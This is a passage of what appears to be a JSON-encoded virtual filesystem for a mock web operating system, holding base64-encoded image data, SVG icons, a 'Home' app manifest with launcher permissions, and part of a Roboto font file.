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", "/system/script": {}, "/system/res/drawable/addLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMTkgMTNoLTZ2NmgtMnYtNkg1di0yaDZWNWgydjZoNnYyeiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/res/drawable/file.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNNiAyYy0xLjEgMC0xLjk5LjktMS45OSAyTDQgMjBjMCAxLjEuODkgMiAxLjk5IDJIMThjMS4xIDAgMi0uOSAyLTJWOGwtNi02SDZ6bTcgN1YzLjVMMTguNSA5SDEzeiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/data/app": {}, "/system/app/Home/manifest.json": "ew0KCSJVSUQiOiJzdG9ja19ob21lX3N5c3RlbSIsDQoJImljbyI6Ii9yZXMvZHJhd2FibGUvZmF2aWNvbi5pY28iLA0KCSJuYW1lIjoiSG9tZSIsDQoJImFjdGl2aXRpZXMiOnsNCgkJIm1haW4iOiB7DQoJCQkiaWNvIjoiL3Jlcy9kcmF3YWJsZS9mYXZpY29uLmljbyIsDQoJCQkicGF0aCI6Ii9pbmRleC5odG1sIg0KCQl9LA0KCQkiaG9tZSI6IHsNCgkJCSJuYW1lIjoiSG9tZSIsDQoJCQkiaWNvIjoiL3Jlcy9kcmF3YWJsZS9mYXZpY29uLmljbyIsDQoJCQkicGF0aCI6Ii9pbmRleC5odG1sIg0KCQl9DQoJfSwNCgkicGVybWlzc2lvbnMiOlsNCgkJIkxJU1RfUEFDS0FHRVMiLA0KCQkiTEFVTkNIX1BBQ0tBR0VTIiwNCgkJIlBFUlNJU1RFTlRfSEFNQlVSR0VSIiwNCgkJIkRFRkFVTFRfSE9NRSINCgldDQp9", "/system/res/drawable/upload.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTkgMTZoNnYtNmg0bC03LTctNyA3aDR6bS00IDJoMTR2Mkg1eiIvPg0KPC9zdmc+", "/system/res/drawable/musicDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTIwIDJIOGMtMS4xIDAtMiAuOS0yIDJ2MTJjMCAxLjEuOSAyIDIgMmgxMmMxLjEgMCAyLS45IDItMlY0YzAtMS4xLS45LTItMi0yem0tMiA1aC0zdjUuNWMwIDEuMzgtMS4xMiAyLjUtMi41IDIuNVMxMCAxMy44OCAxMCAxMi41czEuMTItMi41IDIuNS0yLjVjLjU3IDAgMS4wOC4xOSAxLjUuNTFWNWg0djJ6TTQgNkgydjE0YzAgMS4xLjkgMiAyIDJoMTR2LTJINFY2eiIvPg0KPC9zdmc+", "/data": {}, "/system/res/drawable/editDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMyAxNy4yNVYyMWgzLjc1TDE3LjgxIDkuOTRsLTMuNzUtMy43NUwzIDE3LjI1ek0yMC43MSA3LjA0Yy4zOS0uMzkuMzktMS4wMiAwLTEuNDFsLTIuMzQtMi4zNGMtLjM5LS4zOS0xLjAyLS4zOS0xLjQxIDBsLTEuODMgMS44MyAzLjc1IDMuNzUgMS44My0xLjgzeiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/fonts/roboto.woff2": "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